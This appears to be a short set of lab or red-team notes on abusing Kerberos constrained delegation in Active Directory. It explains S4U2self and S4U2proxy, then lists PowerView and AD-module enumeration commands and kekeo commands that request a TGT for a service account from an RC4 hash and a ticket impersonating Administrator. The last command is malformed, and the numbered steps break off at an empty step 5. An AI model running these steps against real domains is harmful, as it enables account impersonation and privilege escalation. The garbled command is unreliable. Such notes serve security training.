# Abusing Constrained Delegation privileges

Constrained delegation - when enabled on a service account, allows access ony to **specified** services on **specified** computers by impersonating a incoming user

To impersonate the user, Service for User (S4U) extension is used which
provides two extensions:
- Service for User to Self (S4U2self) Allows a service to obtain a forwardable TGS to itself on behalf of a user.
- Service for User to Proxy (S4U2proxy) Allows a service to obtain a TGS to a second service on behalf of a user.


1. Enumerate users/computers with constrained delegation enabled. Observe the values 
- msds-allowedtodelegateto
- useraccountcontrol: TRUSTED_TO_AUTH_FOR_DELEGATION

```powershell
# PowerView_dev
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# ADModule
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

2. Request TGT to 'Become websvc' 
```powershell
./kekeo.exe

tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
```

3. Request TGS to target service as user
```powershell
/tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs dcorp mssql.dollarcorp.moneycorp.LOCAL

```
5. 